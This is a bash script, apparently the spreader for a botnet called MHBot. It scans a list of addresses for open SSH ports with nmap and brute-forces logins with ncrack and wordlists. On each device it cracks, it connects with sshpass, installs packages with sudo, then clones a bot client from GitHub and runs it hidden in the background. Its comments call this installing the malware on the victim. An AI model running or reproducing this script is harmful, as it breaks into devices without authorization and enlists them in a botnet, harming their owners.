#!/bin/bash

#If nmap and git packages are not installed then install them on the victim machine.
dependencyControl ()
{

echo $1 $2 $3 $4


isNodeInstalled=$(sshpass -p $1 ssh -o StrictHostKeyChecking=no $2@$3 "dpkg -s nodejs 2>/dev/null | grep -c 'ok installed'")
isNodeInstalledPi=$(sshpass -p $1 ssh -o StrictHostKeyChecking=no $2@$3 "node -v | grep -c 'v8'")
isGitInstalled=$(sshpass -p $1 ssh -o StrictHostKeyChecking=no $2@$3 "dpkg -s git 2>/dev/null | grep -c 'ok installed'")

if [ $4 -eq 0 ]; then
  if [ $isNodeInstalled -eq 0 ]; then
  sshpass -p $1 ssh -tt -o StrictHostKeyChecking=no $2@$3 "echo $1 | sudo -S apt-get install nodejs"
  fi
elif [ $4 -eq 1 ]; then
  if [ $isNodeInstalledPi -eq 0 ]; then
  sshpass -p $1 ssh -tt -o StrictHostKeyChecking=no $2@$3 "wget https://nodejs.org/dist/v8.11.2/node-v8.11.2-linux-armv7l.tar.xz;sudo tar -xvf node-v8.11.2-linux-armv7l.tar.xz;cd node-v8.11.2-linux-armv7l/;sudo cp -R * /usr/local;sudo rm -rf node-v8.11.2-linux-armv7l"
  fi
fi



if [ $isGitInstalled -eq 0 ]; then
  sshpass -p $1 ssh -tt -o StrictHostKeyChecking=no $2@$3 "sudo apt-get install -y git"
fi
} #End of the Function





#If nmap is not installed then install it.
if [ $(dpkg-query -W -f='${Status}' nmap 2>/dev/null | grep -c "ok installed") -eq 0 ];
then
  apt-get install nmap;
fi




#Scan the network for open ssh ports with given ip address then create an output.
sudo nmap -O -iL ipaddress.txt -oX output -p 22
echo "XXXXXXXXXXXX"


#If ncrack is not installed then install it.
if [ $(dpkg-query -W -f='${Status}' ncrack 2>/dev/null | grep -c "ok installed") -eq 0 ];
then
  apt-get install ncrack;
fi

#If sshpass package is not installed then install it.
if [ $(dpkg-query -W -f='${Status}' sshpass 2>/dev/null | grep -c "ok installed") -eq 0 ];
then
 apt-get install sshpass;
fi

#If git package is not installed then install it.
if [ $(dpkg-query -W -f='${Status}' git 2>/dev/null | grep -c "ok installed") -eq 0 ];
then
  apt-get install git;
fi

ncrack -iX output -U usernamelist.txt -P passwordlist.txt -p 22 | grep 'ssh:' | while read -r line ; do
  echo "Processing $line"
done

#WHILE START
ncrack -iX output -U usernamelist.txt -P passwordlist.txt -p 22 | grep 'ssh:' | while read -r line ;
do {
  echo "Processing $line"
  #Parse the ip address, username and password of the vulnerable device from the ncrack output.
  ipAddress=$(echo $line | grep 'ssh' | awk  {'print $1'})
  username=$(echo $line | grep 'ssh' | cut -d "'" -f 2)
  password=$(echo $line | grep 'ssh' | cut -d "'" -f 4)

  #Get OS name and get if the device a raspberr pi or not
  osResult=$(grep $ipAddress -A 10 output| grep osclass | cut -d '"' -f 4)
  raspResult=$(grep $ipAddress -A 10 output | grep Raspberry | cut -d '"' -f 6 | awk {'print $1'})

  

  echo "RRR== $osResult $raspResult"

  #Getting OS. 0=Linux(ubuntu) 1=Raspberrypi 2=Windows
  if [  "$osResult" = "Linux" ]; then
    if [ "$raspResult" = "Raspberry" ]; then
      echo "RASPBERRY"
      os=1
    else
      os=0
    fi
  else
    os=2
  fi

  #Check the victim device for dependent packages.
  dependencyControl $password $username $ipAddress $os



  echo "Operating system = $os"

  #Try to connect to vulnerable device through shh and it's operating system.
  
  #Try to connect to vulnerable device through ssh and install the malware and execute it.
  sshpass -p $password ssh -o StrictHostKeyChecking=no $username@$ipAddress "git clone https://github.com/HakanKurtt/MHBot-client; cd MHBot-client;npm install;nohup node client.js > /dev/null 2>&1 > foo.out &"


} < /dev/null; done
# WHILE FINISH





